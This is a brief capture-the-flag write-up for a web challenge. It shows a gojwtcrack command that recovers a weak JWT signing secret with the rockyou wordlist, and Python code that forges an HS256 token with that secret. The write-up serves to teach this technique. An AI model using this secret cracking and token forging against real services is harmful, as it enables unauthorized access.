---
title: HAC CTF 2025 Let's Try This Again
draft: false
tags:
  - ctf
  - web-exploitation
  - jwt
---
# Lets Try This Again

> The Chronos Time Vault is back, and this time the signature is checked! And the algorithm is enforced! Can you unlock the vault to claim the flag?

Because we know that the signature and algorithm are being enforced, the only way forward is to crack the secret being used for the JWT signatures. I used [`gojwtcrack`](https://github.com/haxrob/gojwtcrack) and `rockyou.txt` to try and crack the secret:

```bash
gojwtcrack -t token -d /usr/local/share/wordlists/rockyou.txt
```

And this reveals the secret is `chronos`. Thus, we can now forge our own JWT as before, but this time using `chronos` and `HS256`. 

```python
jwt_json = {
   "access_id": "TV-98091",
   "requestor_ip": "10.2.5.15",
   "unlock_timestamp": 1747348400,
   "current_timestamp": 1747348400
}

jwt_token = jwt.encode(jwt_json, 'chronos', algorithm='HS256')
print(jwt_token)
```